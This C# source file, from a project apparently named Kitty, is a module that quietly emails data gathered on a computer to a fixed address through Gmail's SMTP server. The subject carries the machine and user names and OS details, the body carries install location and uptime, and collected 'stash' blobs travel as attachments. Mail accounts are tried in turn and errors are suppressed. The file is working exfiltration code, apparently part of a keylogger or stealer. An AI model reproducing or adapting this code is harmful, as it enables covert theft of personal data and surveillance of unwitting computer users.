using System.Text;
using System.Threading.Tasks;
using Kitty.Stash;
using System.Net.Mail;
using System.Net.NetworkInformation;
using Kitty.Resources;
using System.Net;
using Kitty.Win32;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;

namespace Kitty.Net
{
    internal sealed class SmtpEmailProvider : IServerProvider
    {
        private SmtpClient smtpClient;

        public List<MailProvider> MailProviders { get; private set; }

        public SmtpEmailProvider()
        {
            MailProviders = new List<MailProvider>();
        }

        public void Dispose()
        {
            smtpClient.Dispose();
        }

        public Task<bool> PrepareAsync()
        {
            return Task.Run(async () =>
            {
                bool networkAvailable = NetworkInterface.GetIsNetworkAvailable();
                bool networkOK = false;
                if (networkAvailable)
                {
                    using (Ping ping = new Ping())
                    {
                        var pingResult = await ping.SendPingAsync("google.com");
                        networkOK = pingResult.Status == IPStatus.Success;
                    }
                }
                if (networkOK)
                {
                    smtpClient = new SmtpClient("smtp.gmail.com", 587);
                    smtpClient.EnableSsl = true;
                }
                return networkOK;
            });
        }

        private string GetSubject()
        {
            string subject = string.Format("{0}/{1} - {2} {3}",
                SystemInformation.GetComputerName(),
                SystemInformation.GetUserName(),
                SystemInformation.GetFriendlyOSName(),
                SystemInformation.GetSystemArchitect());
            return subject;
        }

        private string GetBody()
        {
            string kittyVersion = ApplicationInformation.GetVersion();
            string kittyLocation = ApplicationInformation.GetLocation();
            string kittyHowLong = ApplicationInformation.GetHowLong();
            string kittyInstalledTime = ApplicationInformation.GetInstalledTime();
            string mailBody = Properties.Resources.mail_body;
            string mailBodyElement = Properties.Resources.mail_body_element;
            StringBuilder builder = new StringBuilder();
            builder.AppendLine(string.Format(mailBodyElement, "Version", kittyVersion));
            builder.AppendLine(string.Format(mailBodyElement, "Location", kittyLocation));
            builder.AppendLine(string.Format(mailBodyElement, "HowLong", kittyHowLong));
            builder.AppendLine(string.Format(mailBodyElement, "Installed", kittyInstalledTime));
            return string.Format(mailBody, builder);
        }

        private void ChangeProvider(MailProvider provider)
        {
            var credential = new NetworkCredential(provider.FromAddress, provider.FromPassword);
            smtpClient.Credentials = credential;
        }

        private MailMessage PrepareMail(string subject, string body, BaseStash[] stashs, MailProvider provider)
        {
            MailMessage mail = new MailMessage();
            mail.From = new MailAddress(provider.FromAddress, "", Encoding.UTF8);
            mail.To.Add(provider.ToAddress);
            mail.Subject = subject;
            mail.SubjectEncoding = Encoding.UTF8;
            mail.Body = body;
            mail.BodyEncoding = Encoding.UTF8;
            mail.IsBodyHtml = true;
            mail.Priority = MailPriority.High;
            foreach (BaseStash stash in stashs)
            {
                MemoryStream attachmentStream = new MemoryStream(stash.Content);
                Attachment attachment = new Attachment(attachmentStream, stash.ToString());
                mail.Attachments.Add(attachment);
            }
            return mail;
        }

        private bool Send(string subject, string body, BaseStash[] stashs, MailProvider provider)
        {
            ChangeProvider(provider);
            using (MailMessage mail = PrepareMail(subject, body, stashs, provider))
            {
                try
                {
                    smtpClient.Send(mail);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }

        public Task<bool> SendAsync(BaseStash[] stashs)
        {
            return Task.Run(() =>
            {
#if DEBUG
                Debug.WriteLine("Start sending mail with " + stashs.Length + " elements");
#endif
                string subject = GetSubject();
                string body = GetBody();

                foreach (var provider in MailProviders)
                {
                    if (Send(subject, body, stashs, provider))
                    {
#if DEBUG
                        Debug.WriteLine("Send mail sussessful.");
#endif
                        return true;
                    }
                }
#if DEBUG
                Debug.WriteLine("Send mail failed.");
#endif
                return false;
            });
        }
    }
}
